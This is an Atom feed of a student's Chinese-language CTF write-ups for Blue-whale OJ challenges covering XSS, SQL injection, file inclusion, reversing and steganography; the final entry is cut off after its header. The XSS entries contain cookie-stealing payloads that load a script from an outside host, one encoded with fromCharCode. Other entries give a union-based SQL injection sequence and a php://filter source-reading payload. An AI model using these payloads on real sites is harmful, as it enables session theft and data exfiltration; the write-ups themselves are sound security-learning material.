<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pur3wh1tywhite</title>
  
  <subtitle>Better late than never</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://purewhitywhite.github.io/"/>
  <updated>2020-03-12T15:02:41.162Z</updated>
  <id>https://purewhitywhite.github.io/</id>
  
  <author>
    <name>pur3wh1tywhite</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Stage1Day5 Web</title>
    <link href="https://purewhitywhite.github.io/2020-03-12/Stage1Day5-Web/"/>
    <id>https://purewhitywhite.github.io/2020-03-12/Stage1Day5-Web/</id>
    <published>2020-03-12T11:38:25.000Z</published>
    <updated>2020-03-12T15:02:41.162Z</updated>
    
    <content type="html"><![CDATA[<p>XSS2 writeup.</p><a id="more"></a><p>本题目与<a href="https://whitywhite.club/2020-03-09/Stage1Day2-Web/#XSS1" xss1"" target="_blank" rel="noopener">XSS1</a>的不同之处在于并没有告知过滤了哪些字符，我们将XSS1的payload输入后直接查看被过滤后的结果：</p><table><tr><td bgcolor="#87CEFA">hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);//</td></tr></table><center><img src="https://s1.ax1x.com/2020/03/12/8mr6fI.jpg" alt="8mr6fI.jpg" border="0"></center>可以看到后台将<>替换为空，将单引号和双引号用反斜杠转义了。结合给出的提示，看到html使用GBK编码，联想到使用宽字节注入：<h1 id="如何使用-amp-防御"><a href="#如何使用-amp-防御" class="headerlink" title="如何使用&amp;防御"></a>如何使用&amp;防御</h1><ul><li><p>“宽字节”：GB2312、GBK、GB18030、BIG5、Shift_JIS等，占两字节；ASCII占一字节。</p></li><li><p>触发条件：PHP6以下+magic_quote_gpc=on+使用 addslashes()函数对输入的单引号、双引号 、 反斜杠和 NULL 进行转义处理</p></li><li><p>利用方法: 输入%df%22时首先经过上面 addslashes 函数转义变成了%df%5c%22（%5c是反斜杠\），之后后台将被转义后的输入数据返送回前端，前端对其进行 GBK 编码，那么%df%5c 转换成了一个汉字，而双引号就逃逸了出来：</p><center><img src="https://s1.ax1x.com/2020/03/12/8mgIWd.jpg" alt="8mgIWd.jpg" border="0"></center></li><li><p>防御手段：由于 php6 以上的版本 get_magic_quotes_gpc 选项被删除，故不可以再使用addslashes()函数进行转义。对于宽字节SQLi，可以用 mysqli_real_escape_string函数代替以前的addslashes 函数， 他们之间的区别就是 mysql_real_escape_string 会根据mysql 对象中的 mysql-&gt;charset 属性来对待传入的字符串，因此可以根据当前字符集来进行过滤，从而防止了宽字节注入。</p></li></ul><h1 id="后续处理"><a href="#后续处理" class="headerlink" title="后续处理"></a>后续处理</h1><p>虽然实现了双引号逃逸，但可以看到payload里还是有双引号和单引号，这时若被转义则不会生效。此时可以使用<code>fromCharCode()</code>函数进行绕过，这样可以将payload部分转为他们的ascii值，然后作为参数传入这个函数，从而达到防止被转义和过滤的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:name=%d5%22;document.write(String.fromCharCode(102,34,60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,120,115,115,46,102,98,105,115,98,46,99,111,109,47,78,88,69,79,39,59,62,34));//</span><br></pre></td></tr></table></figure><hr><blockquote><p>由于对pwn的了解不足，先对相关知识进行储备：</p><ul><li><a href="https://bbs.pediy.com/thread-247217.htm" title="pwntools" target="_blank" rel="noopener">pwntools</a></li><li><a href="https://luomuxiaoxiao.com/?p=578" title="PLT&amp;GOT" target="_blank" rel="noopener">PLT&amp;GOT</a></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSS2 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Web" scheme="https://purewhitywhite.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day4 Reverse&amp;Misc</title>
    <link href="https://purewhitywhite.github.io/2020-03-11/Stage1Day4-Reverse-Misc/"/>
    <id>https://purewhitywhite.github.io/2020-03-11/Stage1Day4-Reverse-Misc/</id>
    <published>2020-03-11T10:46:44.000Z</published>
    <updated>2020-03-11T13:23:13.332Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>Reverse sign in、junior math、LSB&amp;LSB2 writeup.</p><a id="more"></a><p>首先搞清楚一个一直都没弄清楚的问题，什么是逆向，什么是pwn（好像都是对着一堆汇编调来调去啊）？</p><blockquote><p>逆向工程（Reverse engineering），又称反向工程，是一种技术过程，即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能性能规格等设计要素，以制作出功能相近，但又不完全一样的产品。逆向工程源于商业及军事领域中的硬件分析。其主要目的是，在无法轻易获得必要的生产信息下，直接从成品的分析，推导产品的设计原理。-<a href="https://ctf-wiki.github.io/ctf-wiki/reverse/introduction-zh/" target="_blank" rel="noopener">逆向工程-ctf-wiki</a></p></blockquote><blockquote><p>根据我做过的一点逆向题目，感觉就是<del>把文件拖到IDA或者ollydbg里</del>先静态分析一些文件，包括它的一些代码混淆加壳等的，再动态调试之类的吧</p></blockquote><blockquote><p>”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。</p></blockquote><blockquote><p>我的理解就是利用程序存在的一些问题诸如堆、栈溢出，rop，uaf之类的，来执行shellcode，最后获得目标机器的root权限。</p></blockquote><p><a href="https://error4hack.com/x64dbg-vs-ollydbg-vs-ida-pro/" target="_blank" rel="noopener">x64dbg vs Ollydbg vs IDA Pro</a></p><h1 id="Reverse-sign-in"><a href="#Reverse-sign-in" class="headerlink" title="Reverse sign in"></a>Reverse sign in</h1><p>用IDA打开之后直接按F5，main函数已经出来了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>, a2, a3);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400686((__int64)&amp;s) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到程序是一个flag检验器，输入flag后先判断有没有32个字符，进而再判断将输入的值带入一个<code>sub_400686</code>函数后的返回值，若是1就说明是flag。<br>进入<code>sub_400686</code>看看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_400686</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span>)(*(_BYTE *)(i + a1) ^ byte_400818[i]) != i )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思是将a1（输入的值）逐位与<code>byte_400818</code>这个数组逐位进行<code>^（异或）</code>操作，如果他们的结果==循环变量i，那么就返回1（输入的flag对了）。<br>看看<code>byte_400818</code>：<center><img src="https://s2.ax1x.com/2020/03/11/8Er0lF.jpg" alt="8Er0lF.jpg" border="0"></center></p><blockquote><p>x dup(y)，x是重复的次数，（）里的y是要重复的数<br>刚好32个字符，那么可以编写脚本来找flag，思路是这样的，flag[i]^byte_400818[i] == i，那么flag[i] == byte_400818[i]^i</p></blockquote><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先转十进制</span></span><br><span class="line">d = [<span class="number">102</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">127</span>, <span class="number">60</span>, <span class="number">54</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">100</span>, <span class="number">59</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">124</span>, <span class="number">60</span>, <span class="number">102</span>, <span class="number">84</span>, <span class="number">96</span>, <span class="number">96</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">73</span>, <span class="number">127</span>, <span class="number">113</span>, <span class="number">88</span>, <span class="number">82</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">117</span>, <span class="number">42</span>, <span class="number">98</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    print(chr(d[i] ^ i), end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h1 id="junior-math"><a href="#junior-math" class="headerlink" title="junior math"></a>junior math</h1><p>按F5查看伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>, a2, a3);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;byte_602080);</span><br><span class="line">  sub_4005D6();</span><br><span class="line">  sub_40063F();</span><br><span class="line">  sub_4006A8();</span><br><span class="line">  sub_400711();</span><br><span class="line">  sub_40077A();</span><br><span class="line">  sub_4007E3();</span><br><span class="line">  sub_40084C();</span><br><span class="line">  sub_4008B5();</span><br><span class="line">  sub_400918();</span><br><span class="line">  sub_400981();</span><br><span class="line">  sub_4009EA();</span><br><span class="line">  sub_400A53();</span><br><span class="line">  sub_400ABC();</span><br><span class="line">  sub_400B25();</span><br><span class="line">  <span class="keyword">if</span> ( dword_602064 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>问题：print为何还输入了a2 a3两个参数？</p></blockquote><p>看到输入flag后进行了一堆函数运算，最后判断<code>dword_602064</code>这个东西是0的话输入值即为flag。<br>进入一个函数看看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_4005D6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = (byte_602080 - <span class="number">147</span>) * byte_602080 != <span class="number">-4590</span> || (byte_602082 - <span class="number">147</span>) * byte_602082 != <span class="number">-4850</span>;</span><br><span class="line">  result = v0 | (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602064;</span><br><span class="line">  dword_602064 |= v0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个函数计算了输入字符串的第1位（byte_602080）进行运算后与-4590进行判断，如果这个将第一位带入左边的式子计算结果不等于-4590，那么||（或）的左侧就是一个1，如果等于的话就是0。返回值result貌似没有起到作用不分析，然后将<code>dword_602064</code>与v0进行逐位或，结果存入v0。<br>看了其他的函数结构都一样，变化的就是测试的是输入字符串的第几位。可以看出我们每一次都要满足v0是0，这样才能保证v0与<code>dword_602064</code>逐位或之后才不会出现1（出现1就错了），那么就要式输入字符串的每一位都满足每个函数里的一元二次运算。<br>试着挑一个算了算，<code>(byte_602080 - 147) * byte_602080 = -4590</code>的一个解为102，查ascii表为f，就很显然了。把每一位结果都算出来查ascii即可得到flag。</p><h1 id="LSB-amp-LSB2"><a href="#LSB-amp-LSB2" class="headerlink" title="LSB&amp;LSB2"></a>LSB&amp;LSB2</h1><h2 id="最低有效位（LSB）的原理："><a href="#最低有效位（LSB）的原理：" class="headerlink" title="最低有效位（LSB）的原理："></a>最低有效位（LSB）的原理：</h2><p>因为每个图片的颜色都是由“红”、“绿”、“蓝”三种颜色组成，图片中的其他颜色均可以由这三种颜色混合而成。然而PNG的每种颜色的大小在储存位中占8bit，而LSB隐写原理就是把每种颜色的最后一位进行改写，但是改写后的图片和原图相比，在人的眼中是没有区别的。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>stegsolve打开图片后调整到Red plane0页面就可以看到这个二维码，扫码即得到flag。<br><center><img src="https://s1.ax1x.com/2020/03/11/8Eo4e0.jpg" alt="8Eo4e0.jpg" border="0"></center><br>LSB2的话用lint里提示的<code>zsteg -a secret.png</code>即可看到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;Reverse sign in、junior math、LSB&amp;amp;LSB2 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
    
      <category term="Reverse" scheme="https://purewhitywhite.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day3 Web&amp;Misc</title>
    <link href="https://purewhitywhite.github.io/2020-03-10/Stage1Day3-Web-Misc/"/>
    <id>https://purewhitywhite.github.io/2020-03-10/Stage1Day3-Web-Misc/</id>
    <published>2020-03-10T11:07:53.000Z</published>
    <updated>2020-03-11T13:08:47.943Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>Basic SQL、Invisible flag、docx writeup.</p><a id="more"></a><h1 id="Basic-SQL"><a href="#Basic-SQL" class="headerlink" title="Basic SQL"></a>Basic SQL</h1><p>上来先确定是什么类型的注入，当输入<code>&#39;</code>时候出错，说明这是一个字符型的注入点。<br><br>首先看当前数据表有几列，试到4时出错，说明有三列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; order by 4#</span><br></pre></td></tr></table></figure><p>接下来看前三列中回显在哪几列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,2,3#</span><br></pre></td></tr></table></figure><p>可以看到最下面显示了2、3俩数字，表示可以利用这两个位置回显我们想要的结果，比如当前数据库数据库名、版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,database(),version()#</span><br><span class="line">//回显为news，5.5.62</span><br></pre></td></tr></table></figure><p>再看看所有的库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line">回显为information_schema,news，information_schema库是MySQL自带的，它提供了访问数据库元数据（数据库名或表名、列的数据类型、访问权限等）的方式，优先看news库</span><br></pre></td></tr></table></figure><p>接下来就是爆表、列、数据了：<br>爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;news&apos;#</span><br><span class="line">//回显为f1agfl4gher3,news，进f1agfl4gher3看看</span><br></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;f1agfl4gher3&apos;#</span><br><span class="line">//回显为id,h3r31sfl4g，flag快来了</span><br></pre></td></tr></table></figure><p>爆数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,group_concat(id),group_concat(h3r31sfl4g) from f1agfl4gher3#</span><br><span class="line">//回显就有flag</span><br></pre></td></tr></table></figure><blockquote><p>这比较基础，就是sqli-labs第二关吧，不过sql注入各种操作很多，还有sqlmap的使用，这都是以后要学习的东西</p></blockquote><h1 id="Invisible-flag"><a href="#Invisible-flag" class="headerlink" title="Invisible flag"></a>Invisible flag</h1><p>看到图片只有一半的BLUE-WHALE，再结合提示里的图片长度，就知道了应该使用010editor来修改图片的长度了：<br><center><img src="https://s2.ax1x.com/2020/03/10/8FNRqU.jpg" alt="8FNRqU.jpg" border="0"></center><br>将修改后的结果导出为一个新的图片，即可在下方看到flag。</p><h1 id="docx"><a href="#docx" class="headerlink" title="docx"></a>docx</h1><p>结合提示知道docx格式的文件本质上是一个zip文件，修改后缀名后就可以解压。<br>一个docx文件可能会包含这些目录和组件：</p><ul><li>[Content_Types].xml<br>这个文件描述的是整个文档内容的类型，把各个xml文件组合成一个整体。</li><li>docProps文件夹<br>这个文件夹中的xml记录了docx文档的主要属性信息<br>Core.xml：描述文件的创建时间，标题，主题和作者等给予open xml约定文档格式的通用文件属性<br>App.xml：描述文档的其他属性，文档类型，版本，只读信息，共享，安全属性等特定的文件属性</li><li>rels 文件夹<br>这个文件夹存放了所有指定的rels文件<br>.res文件描述了文档结构中的起始关系，也可以叫做关系部件</li><li>item1.xml<br>包含了一些文档中出现的数据。例如自定义XML数据部件。</li></ul><p>打开修改后缀名后的文件，即可看到flag.xml，打开即可看到flag。</p><h1 id="体会"><a href="#体会" class="headerlink" title="体会"></a>体会</h1><blockquote><p>比较熟悉的Web部分做完了，接下来就是Misc、逆向和pwn了，都没咋做过，希望一切顺利</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;Basic SQL、Invisible flag、docx writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Web" scheme="https://purewhitywhite.github.io/tags/Web/"/>
    
      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day2 Web</title>
    <link href="https://purewhitywhite.github.io/2020-03-09/Stage1Day2-Web/"/>
    <id>https://purewhitywhite.github.io/2020-03-09/Stage1Day2-Web/</id>
    <published>2020-03-09T14:12:50.000Z</published>
    <updated>2020-03-12T14:52:00.650Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>BabyXSS、XSS1、BasicFileInclude writeup.</p><a id="more"></a><h1 id="BabyXSS"><a href="#BabyXSS" class="headerlink" title="BabyXSS"></a>BabyXSS</h1><center><img src="https://s2.ax1x.com/2020/03/09/89vTG4.jpg" alt="89vTG4.jpg" border="0"></center>可以看到这个输入框应该就是注入点了。下面这个地方要求输入一个md5后前六位恰好为等号右边的字符串，一开始以为是找碰撞之类的吧，不过结合hint里推荐的<kbd>proofofwork</kbd>来看应该是要慢慢试出来。不过在安装<kbd>cmake</kbd>、<kbd>MinGW</kbd>，多次google设置cmakefile均无果后选择使用<kbd>hashlib</kbd>包。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999999999</span>):</span><br><span class="line">    s = hashlib.md5(str(i).encode(encoding=<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">"xxxxx"</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>之后就很轻松了，得到对应的字符串后，在上方的留言框里放入获取cookie的脚本，即可将其提交到管理员的后台，（管理员在看到这条信息时）XSS平台便收到了管理员的token：<br><center><img src="https://s2.ax1x.com/2020/03/09/89zbHx.jpg" alt="89zbHx.jpg" border="0"></center><br>使用Burp抓包，将自己的cookie替换为这个token再发包即可得到flag。<br><center><img src="https://s2.ax1x.com/2020/03/09/8CS5If.jpg" alt="8CS5If.jpg" border="0"></center></p><h1 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h1><center><img src="https://s2.ax1x.com/2020/03/09/8C9KA0.jpg" alt="8C9KA0.jpg" border="0"></center><p>这题与<a href="https://whitywhite.club/2020-03-09/Stage1Day2-Web/#BabyXS" babyxss"" target="_blank" rel="noopener">BabyXSS</a>比较相似，也是获取管理员的cookie，不过这一次我们可以看到被注入xss的页面以及它过滤一些敏感符号的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> autofocus=<span class="string">"autofocus"</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">        $text = $_GET[<span class="string">'name'</span>];</span><br><span class="line">        $text = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">'&gt;'</span>,<span class="string">''</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">'&lt;'</span>,<span class="string">''</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">"\n"</span>,<span class="string">''</span>,$text);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;svg&gt;&lt;script&gt;var a=\""</span>. $text . <span class="string">"\"&lt;/script&gt;&lt;/svg&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr /&gt;'</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>可以看到本题对” &lt; &gt; 以及回车进行了过滤，便考虑使用html编码来绕过。</p><table><tr><td bgcolor="#87CEFA">hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);//</td></tr></table>先将双引号闭合，再在html中写进去一个src属性为x（会出错）的img标签，然后onerror会在html中写进去一个src属性为cookie偷取链接的script，最后将后面的一个双引号注释掉。此处之注意将空格也进行编码处理（在提交的页面会进行检测）。输入文本框提交看看效果：<center><img src="https://s2.ax1x.com/2020/03/09/8CCqQe.jpg" alt="8CCqQe.jpg" border="0"></center><p>可以看到成功地写入了上面提到的img标签，并触发了chrome XSS Auditor的预警。</p><blockquote><p>PS:不知道出了什么问题XSS平台一直收不到cookie，有待进一步观察</p></blockquote><blockquote><p>注意到hint里提示，发现输入框有autofocus属性，想到可以结合onfocus来触发XSS，但是这个输入框已经闭合了，注入点并不在其中，又想到自己搞一个文本框，设置一个autofocus，这样管理员进入评论管理版后不用任何操作就会发送flag，但实测这样貌似还是不行</p></blockquote><h1 id="BasicFileInclude"><a href="#BasicFileInclude" class="headerlink" title="BasicFileInclude"></a>BasicFileInclude</h1><center><img src="https://s2.ax1x.com/2020/03/09/8Ci6u4.jpg" alt="8Ci6u4.jpg" border="0"></center><p>题目提示”flag就在这里，但是你看不到“。暗示要读取flag，鉴于不知道当前路径（无法使用file协议）,即考虑使用php伪协议php://filter</p><blockquote><p><strong>php://filter</strong> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p></blockquote><p>这是其参数：</p><blockquote><p>resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<br><br>read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br><br>write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=upload.php</span><br><span class="line">这里读的过滤器为convert.base64-encode，即把输入流base64-encode。</span><br><span class="line">resource=upload.php，代表读取upload.php的内容</span><br></pre></td></tr></table></figure><blockquote><p>问题：一定要使用base64吗？还是说这是一种固定形式（网上几乎都是这种解答）</p></blockquote><p>照葫芦画瓢地构造payload:</p><table><tr><td bgcolor="#87CEFA">http://vps1.blue-whale.me:23338/?page=php://filter/read=convert.base64-encode/resource=flag</td></tr></table>网页上返回了一串base64编码，解码后发现这就是flag的代码。]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;BabyXSS、XSS1、BasicFileInclude writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Web" scheme="https://purewhitywhite.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day1 Web</title>
    <link href="https://purewhitywhite.github.io/2020-03-08/Stage1Day1-Web/"/>
    <id>https://purewhitywhite.github.io/2020-03-08/Stage1Day1-Web/</id>
    <published>2020-03-08T11:46:09.000Z</published>
    <updated>2020-03-11T13:09:38.545Z</updated>
    
